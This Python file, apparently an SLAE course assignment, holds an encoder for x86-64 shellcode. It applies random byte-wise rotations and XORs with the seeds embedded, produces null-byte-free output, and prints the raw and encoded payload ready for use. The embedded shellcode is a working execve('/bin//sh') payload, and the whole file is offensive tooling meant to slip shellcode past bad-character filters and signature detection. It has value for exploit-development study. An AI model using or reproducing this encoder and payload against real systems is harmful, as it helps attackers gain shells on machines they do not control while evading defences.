#coding:utf-8
"""
Filename:      encoder.py
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  05.12.2018
Note:          Python3 Encoder (Null Bytes Free):   Two Bytes insertion
                                                    Rotate left (x first seed byte)
                                                    Xor (with first seed byte)
                                                    Rotate right (x second seed byte)
                                                    Xor (with second seed byte)
"""

import random;

def mask(n):
   """Return a bitmask of length n (suitable for masking against an
      int to coerce the size to a given length)
   """
   if n >= 0:
       return 2**n - 1
   else:
       return 0

def rol(n, rotations, width=8):
    """Return a given number of bitwise left rotations of an integer n,
       for a given bit field width.
    """
    rotations %= width
    if rotations < 1:
        return n
    n &= mask(width)
    return ((n << rotations) & mask(width)) | (n >> (width - rotations))

def ror(n, rotations, width=8):
    """Return a given number of bitwise right rotations of an integer n,
       for a given bit field width.
    """
    rotations %= width
    if rotations < 1:
        return n
    n &= mask(width)
    return (n >> rotations) | ((n << (width - rotations)) & mask(width))

def encode(_shellcode):
    _encoded = ""
    _encoded2 = ""
    for x in bytearray(_shellcode):
        rand1 = random.randint(1,8)
        x = rol(x,rand1)                 # random (1-8) bit rotation to left
        x = x^rand1                      # XOR with first seed
        rand2 = random.randint(1,8)
        x = ror(x,rand2)                 # random (1-8) bit rotation to right
        x = x^rand2                      # XOR with second seed

        if x == 0 :                      # Test if there is nullbyte after encoding
            return ()

        _encoded += '\\x'
        _encoded += '%02x' % x
        _encoded += '\\x%02x' % rand1
        _encoded += '\\x%02x' % rand2
        _encoded2 += '0x'
        _encoded2 += '%02x,' % x
        _encoded2 += '0x%02x,' % rand1
        _encoded2 += '0x%02x,' % rand2
    return (_encoded, _encoded2[:-1])

shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"

decoded = ""
decoded2 = ""
encoded = ()

for x in bytearray(shellcode):
    decoded += '\\x'
    decoded += '%02x' % x
    decoded2 += '0x'
    decoded2 += '%02x,' % x

while True:
    encoded =  encode(shellcode)
    if encoded != ():
        break
    print("Trying to encode again without null byte...")

print("-" * 90)
print("Decoded shellcode:")
print("-" * 90)
print(decoded)
print("-" * 90)
print(decoded2[:-1])
print("-" * 90)
print("Encoded shellcode:")
print("-" * 90)
print(encoded[0])
print("-" * 90)
print(encoded[1])
print("-" * 90)

print("Shellcode Initial Length:", len(bytearray(shellcode)))
print("Shellcode Encoded Length:", int(len(encoded[0])/4))
